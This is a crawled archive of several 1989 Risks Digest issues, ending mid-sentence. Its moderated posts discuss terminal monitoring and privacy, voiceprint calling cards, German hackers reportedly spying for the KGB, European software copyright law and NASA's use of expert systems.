<HR><H3><A NAME="subj6.2">
Reach out and spy
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones@herky.cs.uiowa.edu">
jones@herky.cs.uiowa.edu
</A>&gt;
</address>
<i>
Tue, 28 Feb 89 11:25:29 CST
</i><PRE>

We in the computer field forget our past extremely quickly.  The Sunday, 26 Feb
comments of odyssey!gls@att.att.com about the RADIO program on the SDS Sigma
system at Harvard illustrate this, but there are even earlier illustrations.

I used Com-Share's version of the Berkeley Timesharing System on the SDS 940
back in 1968.  This had a talk/monitor facility that was used by Com-Share's
consultants for on-line user assistance.  As highschool students, we weren't
allowed to use it, but I saw our teacher use it once.

In 1973, the University of Illinois had a talk/monitor mechanism on their PLATO
system.  This was a Computer Based Instruction system, and the instructor of a
course was expected to be able to monitor any students under their charge.
When the system was used outside the instructional context, the "reach out and
spy" potential was very real.  The developers of PLATO were careful to make
talk/monitor use between peers secure -- only after two users had established
a conversation through talk could one let the other monitor his or her screen.

Both the Com-Share and Plato systems had nation-wide user communities, and
unlike oddyssey!gls@att.att.com, I don't remember any concern about FCC
regulations limiting the use of talk facilities.

</PRE>
<HR><H3><A NAME="subj6.3">
Reach out and spy on someone
</A>
</H3>
<address>
Emily Lonsford
&lt;<A HREF="mailto:m19940@mwvm.mitre.org ">
m19940@mwvm.mitre.org 
</A>&gt;
</address>
<i>
Tuesday, 28 Feb 1989 10:31:50 EST
</i><PRE>

There are other products that allow the 'monitor' to watch what the terminal
operator is doing - notably CVIEW on VM and a product by Clyde Digital Systems
on the VAX.  CVIEW at least has an internal ID/password scheme, which of course
should be enabled.  And it gives a warning message to the person being watched
but it's not clear enough for the novice "spy-ee."

I once worked for a utility company that had a couple of hundred customer
service operators (using 2260 terminals...it was a long time ago!) and their
supervisors could listen in on their phone conversations to make sure that
they were doing their jobs and being polite, etc.  The operators could also
signal for assistance if the customer became irate.  But the real use was for
performance monitoring.  Either it was a condition of the job, or it didn't
occur to anyone to complain about invasion of privacy, which it surely was.
There are a lot of parallels between this and the 'spy' products.

On the other hand, a case could be made that the "owner" of the system has a
right to know what it's being used for; for example, no fair using your PC at
work to do your resume or run a business on the side.

Clearly there has to be some reasonable middle ground.  For myself, if it's
so sensitive or private, it's encrypted or on a floppy and locked away.
*      EMILY H. LONSFORD,  MITRE - HOUSTON W123  (713) 333-0922

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 New Sprint Card
</A>
</H3>
<address>
Will Martin -- AMXAL-RI 
&lt;<A HREF="mailto:control@ST-LOUIS-EMH2.ARMY.MIL">
control@ST-LOUIS-EMH2.ARMY.MIL
</A>&gt;
</address>
<i>
Wed, 1 Mar 89 14:54:22 CST
</i><PRE>

The following is from the "Federal Bytes" column on the last page of Federal
Computer Week, Feb. 13 '89:

  PHONE ID
 
  US Sprint announced last week at Comnet that it is testing a telephone
  calling card this is activated only by the card holder's voice.

  Fred Lawrence, Sprint's executive vice president for network development,
  said the Voicecard would work a little like the company's Foncard: Callers
  dial the phone number printed on the card, adding a second number such as a
  birthdate, and then give a two-second verbal password. Sprint equipment
  compares the voice print with one that is on record. The call goes through
  only if the voice prints match, Lawrence said.

  Sprint plans to evaluate its test results this spring to determine whether
  there is a market for the card.

What isn't clear, of course, is if you go through all this before you can
actually begin to dial the number you are trying to call. Maybe this is a way
to call an 800 number and then get into a mode so that you can make a series of
calls authenticated by the initial voiceprint signon process. It seems a lot of
overhead for a single short call. If the card has a magstripe and you run it
through a reader on the phone, and then only have to speak your "password"
phrase before dialling the number you want to reach, it won't be too bad.

I wonder how easily the user (or a cracker) can change the voice "password" (if
at all), and the actual degree of matching that is performed on it. How will
noisy environments (airports, etc.) affect the recognition/verification
process? Anybody out there participating in this test? Please post your
comments and evaluation!

Regards, Will Martin   [Will sent this to another list as well.  Please respond
                       to HIM and we'll let him collect the responses in an
                       orderly fashion...  PGN]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 US missile-warning radar endangers friendly aircraft (Re: <A HREF="/Risks/8.28.html">RISKS-8.28</A>)
</A>
</H3>
<address>
Ken Arnold 
&lt;<A HREF="mailto:arnold@apollo.com">
arnold@apollo.com
</A>&gt;
</address>
<i>
Sat, 25 Feb 89 19:54:59 EST
</i><PRE>

Jon Jacky submits:
&gt;ADEFENSE RADAR MUST TURN OFF AS PLANES LAND - AIR FORCE FEARS SYSTEM
&gt;COULD TRIGGER A BLAST  (no author given)
&gt; ...
&gt;The interruptions are to avoid accidental detonations of tiny explosive 
&gt;charges found in virtually every military weapons system and in the planes 
&gt;and ships that deliver them.

Doesn't one wonder what one's enemy could do with this data?  Imagine -- all
they have to do is build large radar installations, and, at no extra charge,
they can cause incoming weapons to blow themselves up (or otherwise interefere
with their systems).  Once again, the more sophisticated technology is also
vulnerable in unexpected ways.
                              		Ken Arnold

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Error free code and ancient systems
</A>
</H3>
<address>
"Francis,Bill" 
&lt;<A HREF="mailto:RISKS@GRIN1.BITNET">
RISKS@GRIN1.BITNET
</A>&gt;
</address>
<i>
Thu, 2 Mar 89 15:58:31 cdt
</i><PRE>

In a recent issue of RISKS, Bob Wilson cites a Datamation (Feb 15, 1989,
p.53,56) article that reports on "error-free" code developed by IBM for
the space shuttle.  Bob points out several fallacies of the article, let
me add this comment ....

The low error rates cited were achieved largely because the programmers
worked on an ancient, and stable, hardware platform (IBM 360)for years
and years!

How many programmers have the luxury of such stability in the commercial
market and in most of the defense market?

The tradeoffs between error rates and computer power are obvious.

Bill Francis, Noyce Computer Center, Grinnell College, Grinnell, Iowa

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.32.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.34.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-84</DOCNO>
<DOCOLDNO>IA013-000132-B047-77</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.34.html 128.240.150.127 19970217025837 text/html 21424
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:57:05 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 34</TITLE>
<LINK REL="Prev" HREF="/Risks/8.33.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.35.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.33.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.35.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 34</H1>
<H2> Thursday 2 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  German hackers breaking into LOS ALAMOS, NASA,...
</A>
<DD>
<A HREF="#subj1.1">
Claus Kalle via Mabry Tyson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  The Gumbel Machine Becomes a Candid Camera 
</A>
<DD>
<A HREF="#subj2.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  (Un)fairness in European s/w protection 
</A>
<DD>
<A HREF="#subj3.1">
Herman J. Woltring
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
German hackers breaking into LOS ALAMOS, NASA, ...
</A>
</H3>
<address>
Mabry Tyson
&lt;<A HREF="mailto:TYSON@Warbucks.AI.SRI.COM ">
TYSON@Warbucks.AI.SRI.COM 
</A>&gt;
</address>
<i>
Thu, 2 Mar 89 14:55 PST
</i><PRE>

    Date: Thu, 2 Mar 89 10:44 PST
    From: A0061%DK0RRZK0.BITNET@cunyvm.cuny.edu
    To: INFO-NETS@Think.COM
    Subject: hackergerman hackers breaking into LOS ALAMOS, NASA, ...

    Three hours ago, a famous german TV-magazine revealed maybe one of the
    greatest scandals of espionage in computer networks:
    They talk about some (three ?) german hackers (West Germany) breaking
    into several secret data networks (LOS ALAMOS, NASA, some military database,
    (Japanese) war industry, and many others...) in the interests of the KGB,
    USSR. They got money (sums about 50000-100000$ are mentioned) and even drugs,
    all from the KGB, the head of the politic TV-magazine told.
    Read more about it in tomorrow's newpaper....

    Many greetings from Cologne ..                    ^    ^
						     | |  | |
    Claus Kalle                                      | |  | |
    Cologne University, Regional Computing Center   /   \/   \
						    |   ||   |
    BITNET: A0061@DK0RRZK0                          |   \/   |
    ARPA  : A0061%DK0RRZK0.BITNET@WISCVM.WISC.EDU   /        \
    Letter: Regionales Rechenzentrum der Uni Koeln  |  The   |
	    Robert-Koch-Str. 10                     | Koeln  |
	    D-5000 Koeln 41                         | Cathe- |
	    West Germany                            |  dral  |

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
The Gumbel Machine Becomes a Candid Camera
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Thu, 2 Mar 1989 14:52:50 PST
</i><PRE>

For those of you who did not notice, NBC's TODAY show Executive Producer
Marty Ryan asked Bryant Gumbel for a candid evaluation of the show's on- and
off-camera staff, which he wrote on-line.  Recently the private report was
``apparently stolen out of Gumbel's computer file and then given by an NBC
employee to a reporter for Newsday.''  There were lots of red faces.
(Source: San Francisco Chronicle article by Jay Sharbutt of the LA Times, 1
March 1989, p. E1.)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 (Un)fairness in European s/w protection
</A>
</H3>
<address>

&lt;<A HREF="mailto:WWTMHJW@HEITUE5.BITNET">
WWTMHJW@HEITUE5.BITNET
</A>&gt;
</address>
<i>
Tue, 28 Feb 89 13:22 N
</i><PRE>

     A DRAFT PROPOSAL ON SOFTWARE PROTECTION FOR THE EUROPEAN COMMUNITY

A few weeks ago, the Council of the European Communities in Brussels/Belgium
published a draft "Proposal for a Council Directive on the Legal Protection of
Computer Programs" [COM(88)816 (not final)], written by Lord Cockfield M.P. in
agreement with Mr Narjes and Mr Sutherland.  Until January 1989, Lord Cockfield
(pronounced as "cowfield") was Council Commissioner for the Internal Market in
the Community.  As the document seems to challenge various copyright/author's
right doctrines in the Member States of the Community, it is likely to elicit
considerable debate.

From a Risks and Anglo-American law point of view, the draft evokes a number
of questions to be discussed below.  These concern (a) the Anglo-Saxon Law
concept of "Fair Dealing" which is more restricted than its "Fair Use" coun-
terpart under section 107 of the US Copyright Act (for example, wholesale
copying for classroom use is not allowed), (b) copyright/"author's right" in
the case of commissioned works or works created by virtue of employment, and
(c) the scope of protectability in the form/contents or expression/idea
dichotomy under classical copyright which is largely responsible for the
software "look and feel" controversy in the USA.

(a) Fair Dealing

The draft proposes that "computer programs" (also to include source code and
documentation from which the program could be written) should be treated like
any other literary work under the Berne and Universal Copyright Conventions,
including the standard exemptions for literary works under national legislation
in the Member States.  This definition goes much further than the 1977 defini-
tion of the World Intellectual Property Organization (WIPO) in Geneva which is
responsible for administrating the Berne Copyright Convention (the BCC recog-
nizes moral rights and does not require copyright claim formalities on a work).
In 1985, a joint WIPO/UNESCO meeting on Software Protection refused to include
source code in the definition of "computer programs".

The most important states of the European Community are Western Germany, France,
and Great Britain.  Following copyright law revisions in France (1985), Western
Germany (1985), and Great Britain (1988), copyright exemptions are quite differ-
ent between these countries.  In Germany, unauthorized copying for scientific
purposes is standard for literary works (not too much, though), but "programs
for data processing" cannot be copied without authorization.  In France, all
USE and copying of "software" (including documentation) is controlled, except
for the making of a single back-up copy.  In Great Britain, the classical "Fair
Dealing" exemption for research and private study, review, criticism, and news
reporting was maintained last year for commercial research, despite "immense
pressure from monopolistic concerns that wish to restrict information" (E.
Nicholson M.P., debate on the Copyright, Designs and Patents Bill, 19 May 1988);
the same has recently happened in Canada.  In both countries, computer programs
are to be treated like any other literary work.

It may be that the 1985 German and French law revisions were largely motivated
by a desire within the software industry to use copyright law for creating
trade-secret protection for the pure information or know-how underlying a
software package.  If decompilation (a form of research through analysis or
reverse-engineering) is outlawed, know-how is protected against retrieval from
a software package, but independent invention of such know-how and its use for
creating another software package remain free.  In the European Commission's
"Green Paper on Copyright and the Challenge of Technology" published in June
1988, reference was made to a general agreement within the information industry
that "independent invention (...) and reverse engineering" should be allowed
lest competition would be stultified, and Lord Cockfield's draft proposal seems
to ignore the latter part of this citation.

On p. 26 of the draft, reference is made to "(...) the Anglo-Saxon law concept
of 'Fair Dealing' by which reproduction of insubstantial parts of literary
works is permitted under certain circumstances".  In this wording, the differ-
ences between German, French, and British law seem insubstantial, since proper
research, review, criticism etc. of a computer program will usually require
substantial if not complete copying.  In the case of object code, this would
involve decompilation which under copyright law doctrine is a form of copying/
reproduction.  In the case of original or decompiled source code, this would
involve listing, compilation, and running which are also (interpreted as)
legally relevant forms of copying/reproduction.

However, Lord Cockfield's suggestion is incomplete, as the Anglo-Saxon law
concept of "Fair Dealing" is not confined to insubstantial copying of a work
(whether a book, paper, computer program, or other literary work).  Thus, there
are considerable differences between major Member States within the Community,
with an equal competiton opportunity between Silicon Valley (California) and
Silicon Glen (Scotland): under Anglo-American Law, continental-european soft-
ware may be investigated while Anglo-American software cannot currently be
investigated in France and Western Germany unless authorized by the copyright
holder.  This, of cource, constitutes a distinctive competitive advantage out-
side the European continent.

I believe that copying of a complete work, such as a computer program, may be
necessary for fair dealing to apply if done for one of the statutory purposes,
i.e., for research or private study, review, criticism, or news reporting.  In
the words of Barry Torno's "Fair Dealing -- The Need for Conceptual Clarity on
the Road to Copyright Revision" (Consumer and Corporate Affairs Canada 1981,
ISBN 0-662-11746-8, pp. 32 seq.):

   "It might very well be the case that, upon proper application of fair dealing
   considerations, there will be very few situations in which a finding of fair
   dealing will prevail where an entire work has been taken.  However, to pre-
   clude such a possibility AB INITIO is to fetter the dynamic nature of fair
   dealing unnecessarily.

   In what is widely regarded as one of the most incisive Commonwealth explo-
   rations of fair dealing, Lord Justice Megaw of the British Court of Appeal
   stated in the 1971 case of Hubbard et al. v. Vosper et al. (1972, 2 Q.B. 84):

   'It is then said that the passages which have been taken from these various
   works ... are so substantial, quantitatively so great in relation to the
   respective works from which the citations are taken, that they fall outside
   the scope of 'fair dealing'.  To my mind, the question of substantiality is
   a question of degree.  IT MAY WELL BE THAT IT DOES NOT PREVENT THE QUOTATION
   OF A WORK FROM BEING WITHIN THE FAIR DEALING SUBSECTION EVEN THOUGH THE QUO-
   TATION MAY BE OF EVERY SINGLE WORD OF THE WORK ...' "

On 9 Feb 1972, the Appeal Committee of the British House of Lords dismissed a
petition for leave to appeal against this verdict.  Note that 'fair dealing'
does not in a statutory way distinguish between various forms of reproduction
such as quoting, listing, or translating; this has been left to case law.
Furthermore, computer programs were hardly discussed by Torno.

In "Copyright and the Computer" (Consumer and Corporate Affairs Canada 1982,
ISBN 0-662-11748-4), John Palmer and Raymond Resendes from the University of
Western Ontario wrote on p. 126:

   "Allowing fair dealing provisions for computer software seems questionable.
   On the one hand, there should be no objection to allowing researchers for
   PRIVATE (and personal) study and review once the software has been developed
   and marketed.  On the other hand, the loss of a single sale of the software
   could result in the loss of revenue to the developer of thousands of dollars.
   If fair dealing provisions are allowed for computer software, they should be
   limited specifically to personal study and research concerning the SOFTWARE
   ITSELF, and they should NOT include study and research which uses the soft-
   ware for the study and research of other questions."

In my mind, the latter would not necessarily apply always, as in the case of
software published in the academic literature or via non-commercial electronic
mail libraries (e.g., NETLIB@RESEARCH.ATT.COM, cf. the paper by Dongarra &amp;
Grosse in the May 1987 issue of the Communications of the ACM).  Especially
numerical software is widely available for non-commercial use, and this aspect
seems to have been overlooked by most writers on software protection, even
though such software is not necessarily in the public domain.

A Canadian Library of Parliament report (Monique He'bert, "Copyright Act
Reform", ISBN 0-660-12598-6, 1987, p. 5) states:

   "(E)ven when substantial reproduction has occurred, users may be exonerated
   if they come within one of the statutory defenses.  The most important of
   these is the 'fair dealing' provision which excuses 'any fair dealing with
   any work for the purposes of private study, research, criticism, review, or
   newspaper summary'."

Wrapping up these quotations in a software context, I think that copying of
a complete work such as a computer program may be necessary for FAIR dealing
to hold; only in this way, a researcher, reviewer, or criticist may be able
to "tell the truth, the whole truth, and nothing but the truth".  This applies
to profitable situations, where the underlying but unprotected ideas (trade
secrets?) of a computer program are to be found and used for creating a differ-
ent, and hopefully better computer program.  Under the US "Fair Use" doctrine,
this is perfectly lawful, industrial practice; cf. the "clean room" procedure,
where one team analyses a competitor's package, while a second, clean team
writes a new package from the first team's specifications.  For a hardware
product under, e.g., patent law or semiconductor topography protection law,
research is perfectly legitimate, and there is no reason why this should be
outlawed for software, especially since hardware and software can often be
interchanged.

Similar arguments hold for the non-profit situation, as when claims about
the quality of a commercial software package in the academic or commercial
literature are to be verified by scientists or consumer organisations, or when
a software package is suspected of endangering human life, health, or property;
this latter aspect was addressed in Risks Digest Vol. 8, No. 5 of 11 Jan 1989
with respect to the Therac-25 radiation therapy machine malfunction.

While the Universal Copyright Convention requires a Copyright notice to be
included in a work for copyright protection to hold, such a formality is not
required under the Berne Copyright Convention recently ratified by the USA
which are currently the world's leading software producer.  By consequence,
various "fair" forms of copying are currently under threat of being outlawed
even if no copyright claim is provided on a work.

Of course, copying for unfair purposes should be prevented, both in a profit-
able and non-profitable context.  For example, a number of recent, federal US
verdicts that the US Copyright Act should yield to the 11th Amendment are reason
for serious concern:  see "An Open Letter on Piracy", Software Magazine 8(3),
March 1988, republished in ACM's Computers &amp; Society 18(3), July 1988.  Under
the 11th Amendment's grant of sovereign immunity to states, civil suits for
copyright damages against state instrumentalities (e.g., state universities!)
will be lost before trial.

(b) Work for hire

Under the Anglo-American "work for hire" rule, copyright law usually gives all
exploitation rights to the employer, and sometimes even to the commissioner of
a copyrightable work; moral rights have been excluded for computer programs in
the United Kingdom, and they have been limited in France.  In Germany, however,
moral rights have been maintained in full, and case law has given an implicit
right of use to the employer or commissioner.  Such use may involve sales to
third parties if this is the (implied) consequence of the contract.  Lord Cock-
field has proposed that all rights on software created under employment or
commission should revert to the employer or commissioner (unless parties agree
otherwise), and this will undoubtedly cause considerable disagreement in most
Member States of the Community, at least for commissioned software.

Under the continental-european doctrine of "author's rights", certain moral
rights (paternity, divulgation, integrity) are inalienable from the natural
author(s) who create a work, and it is largely this aspect which underlies the
debate within the European Community (moral rights were a strong issue in the
USA in the debate around the Berne Convention Ratification Bill).  From a Risks
point of view, I would think that author's rights and author's duties should be
seen in conjunction.  With the commercial pressure that deadlines are met in
software projects (cf. the Risks Digest issue quoted above), an employed or
commissioned author should, in my view, be able to invoke his moral rights in
order to offset any pressure from employer or commissioner to deliver on time.
While Lord Cockfield mentioned the right of paternity (i.e., the right to be
named as the author of a work), it is too simple to leave responsibility for
the quality of a work, closely related to the moral rights of divulgation and
integrity, with the entity that delivers a software-related product to a cus-
tomer.  If an employed or commissioned author has good reason to believe that
his work has been insufficiently tested, his "droit de divulgation" should be
used to prevent premature delivery to unsuspecting customers.  Personal lia-
bility for a defective software package should complement this moral right as
a moral obligation.

(c) Ideas or contents v. form or expression under Copyright

Traditionally, copyright protects merely the expression or form of a work, not
the "naked ideas", contents, or pure information in the work.  The boarderline
is a difficult one, as exemplified by Lord Cockfield's proposal on algorithms
and on accessability of interfaces which, for scientific progress and compati-
bility between different manufacturers' products to be possible, should be free
to anyone:

   Chapter 1, Article 1, "Object of Protection",
   ...
   3. Protection in accordance with this Directive shall apply to the expression
   in any form of a computer program but shall not extend to the ideas, prin-
   ciples, logic, algorithms or programming languages underlying the program.
   Where the specification of interfaces constitutes ideas and principles which
   underly the program, those ideas and principles are not copyrightable sub-
   ject matter.


I hope that this posting on the Risks Digest (and perhaps on other lists) will
elicit a debate that could be fed back to the European Commission.  I look for-
ward to such reactions.


Herman J. Woltring &lt;na.woltring@patience.stanford.edu, wwtmhjw@heitue5.bitnet&gt;
Brussellaan 29, NL-5628 TB  EINDHOVEN, The Netherlands, Tel. INT+31.40.480869

Member, Study-Committee on Software and Semiconductor Topography Protection,
Netherlands Association for Computers and Law

Research Associate in Biomedical and Health Technology,
Eindhoven University of Technology, The Netherlands

(On leave from the Software Engineering Department,
 Philips Medical Systems, Best near Eindhoven, The Netherlands)

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.33.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.35.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-85</DOCNO>
<DOCOLDNO>IA013-000132-B047-108</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.35.html 128.240.150.127 19970217025850 text/html 20650
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:57:18 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 35</TITLE>
<LINK REL="Prev" HREF="/Risks/8.34.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.36.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.34.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.36.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 35</H1>
<H2> Monday 6 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  NASA to replace top-level personnel with Expert Systems 
</A>
<DD>
<A HREF="#subj1.1">
Dave Davis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  A Touching Faith in Technology 
</A>
<DD>
<A HREF="#subj2.1">
Ruaridh Macdonald
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computer catches thief 
</A>
<DD>
<A HREF="#subj3.1">
Randall [!] Davis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Computer espionage: 3 `Wily Hackers' arrested 
</A>
<DD>
<A HREF="#subj4.1">
Klaus Brunnstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: West German Hackers 
</A>
<DD>
<A HREF="#subj5.1">
Dana Kiehl
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  The word "hacking" 
</A>
<DD>
<A HREF="#subj6.1">
Geoffrey Knauth
</A><br>
<A HREF="#subj6.2">
 Rao V. Akella
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  747 Simulators Can't Simulate Flight 811 Failures 
</A>
<DD>
<A HREF="#subj7.1">
Scot E Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Viruses in the comics 
</A>
<DD>
<A HREF="#subj8.1">
Peter Merel
</A><br>
<A HREF="#subj8.2">
 Tom Parker
</A><br>
<A HREF="#subj8.3">
 Len Levine
</A><br>
<A HREF="#subj8.4">
 Guy Robinson
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
NASA to replace top-level personnel with Expert Systems
</A>
</H3>
<address>
dave davis 
&lt;<A HREF="mailto:davis@community-chest.mitre.org">
davis@community-chest.mitre.org
</A>&gt;
</address>
<i>
Mon, 06 Mar 89 12:52:29 -0500
</i><PRE>

From the 6 March New York Times, page 1, comes a news item that NASA faces
the possibilty of retirement of ALL of its senior and top-level managers,
engineers and scientists within five (5!) years.

To address this, NASA plans to continue a trend that it has already been
implementing.  That is, it will seek to capture expert knowledge via expert
systems, and where it can, replace people with embedded systems containing this
expertise.  Currently, NASA is utilizing such systems to perform Space Shuttle
fueling and monitoring, countdown diagnostics (some risks there...), and
telemetry monitoring and interpreting.  For example, NASA says that it can take
two years to train an individual to interpret a data stream from a satellite
(after which he/she is probably a bit warped).  NASA was able to completely
replace the console operator in an example of this with an embedded system
which included friendlier user display and interpretive knowledge.

The article points out that not all of those elegible for retirement will take
it, however, if this program is successfull, the decision may be made for some
of them.

Many of the technical risks of such a program are numerous and obvious.  One
which may not be quite so obvious is stagnation, that is, how will NASA
incorporate new knowledge into its systems and how will such knowledge be
developed and recognized.  This may be a non-problem, in that previous
technological advances (see the steam engine) taught us more than was ever
expected when they were invented.

Dave Davis, MITRE Corp., 7525 Colshire Dr, McLean, VA 22102

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
A Touching Faith in Technology
</A>
</H3>
<address>
MACDONALD@hermes.mod.uk 
&lt;<A HREF="mailto:Ruaridh Macdonald">
Ruaridh Macdonald
</A>&gt;
</address>
<i>
6-MAR-1989 12:15:22 GMT
</i><PRE>

     The question of whether we in the U.K. should carry identity cards is
currently being debated, particularly in the press. It has been stirred up by
the Government's intention to introduce identity cards for attendees at
football matches, as part of an attempt to curb hooliganism.

     The following appeared as the leading article in The Times on 10th
February (reproduced without permission), and shows a touching, if misplaced,
faith in technology by non-technologists. (The highlighting is my own.)

"British suspicion of identity cards is deeply rooted. But it is not as
